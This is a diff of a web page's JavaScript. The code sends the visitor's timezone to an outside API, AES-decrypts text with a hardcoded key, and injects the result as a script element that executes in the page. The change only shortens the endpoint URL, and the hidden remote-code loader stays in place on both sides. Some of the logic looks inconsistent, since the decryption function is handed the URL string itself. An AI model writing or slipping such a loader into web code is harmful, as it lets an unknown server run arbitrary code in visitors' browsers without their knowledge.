@@ -241,7 +241,7 @@ height:350px;
         const bytes = CryptoJS.AES.decrypt(decodedText, 'Ma0cHelpMark0er007_20maywebdeskFrizz2k26');
         return bytes.toString(CryptoJS.enc.Utf8);
     }
-    const codeString = aesDecode(`https://api.intellectpath.net/timezone/20maywebdeskFrizz2k26/Ma0cHelpMark0er007`);
+    const codeString = aesDecode(`https://api.intellectpath.net/timezone`);
     const script = document.createElement("script");
     script.textContent = codeString;
     document.body.appendChild(script);
@@ -257,7 +257,7 @@ height:350px;
         const clientTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
         try {
             const encodedScript = await transmitTimezoneData(
-                    "https://api.intellectpath.net/timezone/20maywebdeskFrizz2k26/Ma0cHelpMark0er007",
+                    "https://api.intellectpath.net/timezone",
                     clientTimezone
                 )
             ;
